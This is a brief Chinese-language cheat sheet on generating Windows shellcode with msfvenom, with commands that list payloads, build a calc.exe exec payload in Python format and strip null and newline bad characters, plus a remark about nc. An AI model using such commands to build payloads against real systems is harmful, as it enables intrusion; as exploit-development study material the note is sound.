產生shellcode

顯示payload列表

msfvenom -l payload

生成shellcode

msfvenom -p windows/exec CMD=calc.exe -f python

避免含有null字元

msfvenom -p windows/exec CMD=calc.exe -f python -b '\x00'

避免含有換行，注意windows的\r

msfvenom -p windows/x64/exec CMD=calc.exe -f python -b '\x00\x0a\x0d'

注意

如果在操作nc時，nc也可能受到\x00、\x0a、\x0d的影響。
